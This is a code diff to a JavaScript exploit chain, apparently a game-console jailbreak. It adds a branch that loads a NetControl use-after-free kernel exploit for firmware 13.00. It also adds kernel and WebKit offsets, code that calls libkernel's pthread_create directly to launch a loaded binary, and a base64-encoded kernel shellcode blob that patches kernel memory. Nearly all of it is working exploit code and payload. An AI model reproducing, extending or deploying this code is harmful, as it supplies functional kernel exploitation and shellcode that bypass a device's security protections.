@@ -65,9 +65,10 @@ function get_syscall(id) {
 async function exploit() {
   if (version.major < 12 || (version.major === 12 && version.minor <= 2)) {
     await load_script('src/lapse.js');
+  } else if (version.major === 13 && version.minor === 0) {
+    await load_script('src/netctrl.js');
   } else {
     throw new Error(`${version} exploit is WIP`);
-    //await load_script('src/lapse.js');
   }
 
   await exploit_main();
@@ -171,8 +172,23 @@ async function load_bin() {
   mem.copy(entry_addr, bin_u8.buffer.data(), bin_u8.length);
 
   const pthread_addr_addr = mem.alloc(8);
+  mem.bset(pthread_addr_addr, 8);
 
-  if (fn.pthread_create.invoke(pthread_addr_addr, 0, entry_addr, 0)) {
+  // 13.00 has no WebKit pthread_create offset. The verified chain calls the
+  // libkernel syscall stub directly; check the WebKit GOT slot agrees first.
+  const fw_impl = impl_map[version.major] || {};
+  const raw_impl = fw_impl[version.minor] || {};
+  const direct_create = raw_impl.k_pthread_create !== undefined;
+
+  let create_fn = fn.pthread_create;
+  if (direct_create) {
+    const expected = libkernel_base.add(raw_impl.k_pthread_create);
+    const got = arw.view(webkit_base.add(raw_impl.wk___imp_pthread_create)).getBInt(0, true);
+    logger.debug(`pthread_create got: ${got}, expected: ${expected}`);
+    create_fn = new NativeFunction(expected, 'number');
+  }
+
+  if (create_fn.invoke(pthread_addr_addr, 0, entry_addr, 0)) {
     throw new Error('Unable to create bin thread !!');
   }
 
@@ -181,15 +197,19 @@ async function load_bin() {
 
   logger.info(`Created bin thread with id ${pthread_id} !!`);
 
-  const ret_addr = mem.alloc(8);
+  // GoldHEN stays resident, so joining here would block forever.
+  if (!direct_create) {
+    const ret_addr = mem.alloc(8);
 
-  if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
-    throw new Error(`Unable to join thread ${pthread_id} !!`);
+    if (fn.pthread_join.invoke(pthread_addr, ret_addr)) {
+      throw new Error(`Unable to join thread ${pthread_id} !!`);
+    }
+
+    const ret = arw.view(ret_addr).getInt32(0, true);
+
+    logger.info(`bin returned ${ret} !!`);
+    mem.free(ret_addr);
   }
-
-  const ret = arw.view(ret_addr).getInt32(0, true);
-
-  logger.info(`bin returned ${ret} !!`);
 
   mem.free(pthread_addr_addr);
 }
@@ -878,6 +898,13 @@ const impl_map = {
   13: {
     0: {
       k_evf_cv_desc: 0x7849d8,
+      // NetControl UAF kernel exploit (13.00).
+      k_kl_lock: 0xe6c20,
+      k_sysent_661: 0x110a760,
+      k_jmp_qword_ptr_rsi: 0x47b31,
+      // 13.00 has no WebKit pthread_create offset; call libkernel directly.
+      wk___imp_pthread_create: 0x3cb9c00,
+      k_pthread_create: 0x10110,
       k_shellcode:
         'uYIAAMAPMkjB4iCJwEgJwkiNikD+//8PIMBIJf///v8PIsC46wQAAL7rBAAAv5Dp//9BuOsAAABmiYHjdhsAuOsEAABBuesAAABBuusAAABmiYFMwS8AQbvrAAAAuJDp//9IgcJxeQQAZomx83YbAGaJuRN3GwBmRImBhHtiAMaBzQoAAOvGgS3UKwDrxoFx1CsA68aB7dQrAOvGgTHVKwDrxoHd1isA68aBjdsrAOvGgV3cKwDrZkSJiW+EYgDHgZAEAAAAAAAAxoHCBAAA62ZEiZG5BAAAZkSJmbUEAADGgUYVOQDrZomBpHEbAMeBWHcbAJDpPAHHgcDYOwBIMcDDxoF6px8AN8aBfacfADfHgYAtEAECAAAASImRiC0QAceBrC0QAQEAAAAPIMBIDQAAAQAPIsAxwMM=',
 
